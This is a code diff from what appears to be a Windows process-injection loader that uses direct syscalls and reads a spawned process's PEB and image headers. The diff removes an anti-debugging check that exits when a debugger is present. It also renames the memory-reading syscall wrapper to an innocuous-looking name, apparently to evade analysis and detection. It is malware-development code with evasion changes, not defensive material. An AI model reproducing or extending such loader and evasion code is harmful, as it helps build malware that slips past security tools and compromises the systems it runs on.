@@ -11,10 +11,6 @@
 #define UP -32
 #define DOWN 32
 
-#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10
-#define FLG_HEAP_ENABLE_FREE_CHECK 0x20
-#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
-#define NT_GLOBAL_FLAG_DEBUGGED ( FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS )
 
 typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
     HANDLE  ProcessHandle,
@@ -35,7 +31,7 @@ EXTERN_C NTSTATUS myNtGetContextThread(
 
 );
 
-EXTERN_C NTSTATUS myNtReadVirtualMemory(
+EXTERN_C NTSTATUS whatForeverMemory(
     IN  HANDLE  ProcessHandle,
     IN  LPCVOID   BaseAddress,
     OUT PVOID   Buffer,
@@ -249,18 +245,11 @@ void prestuff(unsigned char* code, int len) {
     }
 }
 
-DWORD checkNtGlobalFlag() {
-    PPEB ppeb = (PPEB)__readgsqword(0x60);
-    DWORD myNtGlobalFlag = *(PWORD)((PBYTE)ppeb + 0xBC);
-    if (myNtGlobalFlag & NT_GLOBAL_FLAG_DEBUGGED) {
-        exit(0);
-    }
-    return 0;
-}
+
 
 int main()
 { 
-    checkNtGlobalFlag();
+    
  
     
         SYSTEM_INFO systemInfo;
@@ -337,7 +326,7 @@ int main()
         GetSyscall(syscallNum);
         GetSyscallAddr(syscallAddr);
 
-        NTSTATUS status2 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)pebAddress, &peb, sizeof(peb), bytesRead);
+        NTSTATUS status2 = whatForeverMemory(pi.hProcess, (LPCVOID)pebAddress, &peb, sizeof(peb), bytesRead);
      
         
     
@@ -346,13 +335,13 @@ int main()
         DWORD_PTR imageBaseValue = 0;
         SIZE_T bytesReadAgain = NULL;
 
-        NTSTATUS status3 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)imageBaseAddress, &imageBaseValue, sizeof(imageBaseValue), bytesReadAgain);
+        NTSTATUS status3 = whatForeverMemory(pi.hProcess, (LPCVOID)imageBaseAddress, &imageBaseValue, sizeof(imageBaseValue), bytesReadAgain);
 
   
         BYTE headersBuffer[4096] = {};
         
 
-        NTSTATUS status4 = myNtReadVirtualMemory(pi.hProcess, (LPCVOID)imageBaseValue, headersBuffer, 4096, NULL);
+        NTSTATUS status4 = whatForeverMemory(pi.hProcess, (LPCVOID)imageBaseValue, headersBuffer, 4096, NULL);
 
         PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
         PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
